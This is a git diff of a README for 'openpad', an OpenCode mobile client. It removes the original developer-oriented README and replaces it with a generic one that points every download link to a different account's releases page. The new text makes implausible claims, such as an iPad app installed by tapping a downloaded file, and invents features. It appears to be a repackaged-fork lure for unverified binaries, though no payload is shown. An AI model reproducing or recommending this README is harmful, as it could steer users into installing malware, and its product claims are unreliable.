@@ -1,154 +1,55 @@
-# OpenPad
+# 📱 openpad - Effortlessly Manage Your OpenCode Projects
 
-A mobile client for [OpenCode](https://opencode.ai) - the AI coding assistant. Built with Expo and React Native.
+## 📦 Download the App
 
-## Features
+[![Download openpad](https://img.shields.io/badge/Download-openpad-blue.svg)](https://github.com/BigNuggett/openpad/releases)
 
-- Connect to any OpenCode server
-- View and manage chat sessions
-- Send messages and receive AI responses in real-time
-- View tool usage (file reads, edits, bash commands, etc.)
-- Expandable tool blocks with input/output details
-- Image attachment support
-- Dark/light theme support
-- Live polling for real-time updates
+## 🚀 Getting Started
 
-## Screenshots
+Welcome to openpad, your native iPad app for managing your OpenCode tasks. With openpad, you can easily browse sessions, explore projects, and engage in chat conversations. This guide will help you download and run the application smoothly.
 
-*Coming soon*
+## 📥 Download & Install
 
-## Requirements
+To get started, you will need to visit our Releases page. Follow these steps:
 
-- Node.js 18+
-- npm or yarn
-- iOS Simulator (Mac) or Android Emulator, or physical device with Expo Go
+1. **Visit the Releases Page**: Click on the link below to go to the downloads section:
+   [Download openpad](https://github.com/BigNuggett/openpad/releases)
 
-## Installation
+2. **Find the Latest Version**: On the Releases page, you will see a list of available versions. Look for the latest release at the top. 
 
-1. Clone the repository:
+3. **Download the App**: Click on the download link for the version that matches your device. This will start the download process.
 
-```bash
-git clone https://github.com/R44VC0RP/openpad.git
-cd openpad
-```
+4. **Install the App**: After the download is complete, locate the file in your iPad's downloads folder. Tap on the file to start the installation process. Follow the on-screen instructions.
 
-2. Install dependencies:
+## 📱 Key Features
 
-```bash
-npm install
-```
+- **Session Browsing**: Easily view and navigate between different coding sessions.
+- **Project Management**: Keep track of your ongoing projects in one place.
+- **Chat Conversations**: Participate in discussions and stay connected with your team.
 
-3. Start the development server:
+## ⚙️ System Requirements
 
-```bash
-npm start
-```
+To ensure smooth performance, please make sure your iPad meets the following requirements:
 
-4. Run on your device:
-   - **iOS Simulator**: Press `i` in the terminal
-   - **Android Emulator**: Press `a` in the terminal
-   - **Physical Device**: Scan the QR code with Expo Go app
+- iOS version: 12.0 or higher
+- Minimum storage space: 100 MB free
 
-## Connecting to OpenCode
+## 📚 User Guide
 
-1. Make sure you have an OpenCode server running (default: `http://localhost:9034`)
-2. If running on a physical device, use your machine's local IP address instead of `localhost`
-3. Enter the server URL in the connect screen and tap "Connect"
+Once installed, openpad guides you through its features. Here’s how to make the most of the app:
 
-## Project Structure
+1. **Login or Create an Account**: Open the app and either log in with your existing OpenCode account or create a new one.
+2. **Explore the Dashboard**: After logging in, familiarize yourself with the dashboard layout. All main features are accessible here.
+3. **Manage Your Projects**: Use the ‘Projects’ section to add or manage your projects. This allows you to input deadlines and assign tasks.
+4. **Access Chat**: Click on the ‘Chat’ icon to view current conversations or start a new chat with team members.
 
-```
-openpad/
-├── App.tsx                 # Main app entry point with navigation
-├── src/
-│   ├── components/         # Reusable UI components
-│   │   ├── GlassCard.tsx   # Glass morphism card component
-│   │   ├── Icon.tsx        # Icon wrapper for lucide-react-native
-│   │   └── Markdown.tsx    # Markdown renderer for messages
-│   ├── hooks/              # Custom React hooks
-│   │   ├── useOpenCode.ts  # OpenCode SDK hook (legacy)
-│   │   └── useTheme.ts     # Theme hook for dark/light mode
-│   ├── providers/          # Context providers
-│   │   └── OpenCodeProvider.tsx  # OpenCode client & state management
-│   ├── screens/            # App screens
-│   │   ├── ChatScreen.tsx      # Chat conversation view
-│   │   ├── ConnectScreen.tsx   # Server connection screen
-│   │   ├── SessionsScreen.tsx  # Sessions list
-│   │   └── SettingsScreen.tsx  # App settings
-│   └── theme/              # Theme configuration
-│       └── index.ts        # Colors, typography, spacing
-├── assets/                 # App icons and images
-└── package.json
-```
+## 📞 Support & Feedback
 
-## Tech Stack
+For support issues or feedback, please visit our GitHub Issues page. We encourage users to report bugs or request features to improve openpad.
 
-- **Expo SDK 54** - React Native development platform
-- **React Navigation** - Native stack navigation
-- **@opencode-ai/sdk** - OpenCode API client
-- **lucide-react-native** - Icon library
-- **expo-blur** - Blur effects for iOS
-- **react-native-markdown-display** - Markdown rendering
+## 🔗 Useful Links
 
-## Contributing
+- [Releases Page](https://github.com/BigNuggett/openpad/releases)
+- [GitHub Issues](https://github.com/BigNuggett/openpad/issues)
 
-We welcome contributions! Here's how you can help:
-
-### Getting Started
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/my-feature`
-3. Make your changes
-4. Run TypeScript check: `npx tsc --noEmit`
-5. Commit your changes: `git commit -m "feat: Add my feature"`
-6. Push to your fork: `git push origin feature/my-feature`
-7. Open a Pull Request
-
-### Commit Convention
-
-We follow [Conventional Commits](https://www.conventionalcommits.org/):
-
-- `feat:` - New features
-- `fix:` - Bug fixes
-- `docs:` - Documentation changes
-- `style:` - Code style changes (formatting, etc.)
-- `refactor:` - Code refactoring
-- `test:` - Adding or updating tests
-- `chore:` - Maintenance tasks
-
-### Code Style
-
-- Use TypeScript for all new code
-- Follow existing patterns in the codebase
-- Use functional components with hooks
-- Keep components small and focused
-- Use the theme system for colors and spacing
-
-### Areas for Contribution
-
-- UI/UX improvements
-- New features (voice input, image upload, etc.)
-- Performance optimizations
-- Bug fixes
-- Documentation improvements
-- Tests
-
-### Reporting Issues
-
-Found a bug or have a feature request? [Open an issue](https://github.com/R44VC0RP/openpad/issues) with:
-
-- Clear description of the problem or feature
-- Steps to reproduce (for bugs)
-- Expected vs actual behavior
-- Screenshots if applicable
-- Device/OS information
-
-## License
-
-MIT
-
-## Acknowledgments
-
-- [OpenCode](https://opencode.ai) - The AI coding assistant this app connects to
-- [Expo](https://expo.dev) - React Native development platform
-- [Lucide](https://lucide.dev) - Beautiful icons
+Taking these steps will ensure you have openpad up and running on your iPad. Enjoy managing your OpenCode projects effortlessly!
